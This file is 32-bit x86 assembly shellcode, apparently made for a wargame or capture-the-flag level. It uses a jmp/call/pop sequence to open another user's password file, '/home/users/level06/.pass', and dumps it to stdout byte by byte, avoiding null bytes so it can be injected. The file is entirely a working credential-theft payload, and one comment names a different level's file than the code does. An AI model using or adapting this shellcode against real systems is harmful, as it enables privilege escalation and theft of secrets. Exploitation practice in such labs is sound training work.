BITS 32

_start:
    xor eax, eax            ; clear registers
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx
    jmp  call_path          ; jump down to the CALL that sits just before the path

open_file:
    pop  ebx                ; ebx = address of "/home/users/level05/.pass" (pushed by call)
    mov  al, 5              ; SYS_open
    xor  ecx, ecx           ; flags = O_RDONLY (0)
    int  0x80               ; open(path, O_RDONLY)
    mov  esi, eax           ; save returned fd in esi

    jmp  read_byte          ; enter the read/write loop

exit_prog:                  ; reached when read() returns 0 (EOF)
    mov  al, 1              ; SYS_exit
    xor  ebx, ebx           ; status 0
    int  0x80               ; exit(0)

read_byte:
    mov  ebx, esi           ; ebx = fd
    mov  al, 3              ; SYS_read
    sub  esp, 1             ; carve 1 byte of buffer on the stack
    lea  ecx, [esp]         ; ecx = &buffer
    mov  dl, 1              ; count = 1 byte
    int  0x80               ; read(fd, buf, 1)

    xor  ebx, ebx
    cmp  ebx, eax           ; did read() return 0 ? (end of file)
    je   exit_prog          ; yes -> exit cleanly

    mov  al, 4              ; SYS_write
    mov  bl, 1              ; fd = 1 (stdout)
    mov  dl, 1              ; count = 1 byte
    int  0x80               ; write(1, buf, 1)
    add  esp, 1             ; release the 1-byte buffer
    jmp  read_byte          ; loop on the next byte

call_path:
    call open_file          ; pushes the address of the bytes that follow...
    db  "/home/users/level06/.pass"   ; ...i.e. the path string
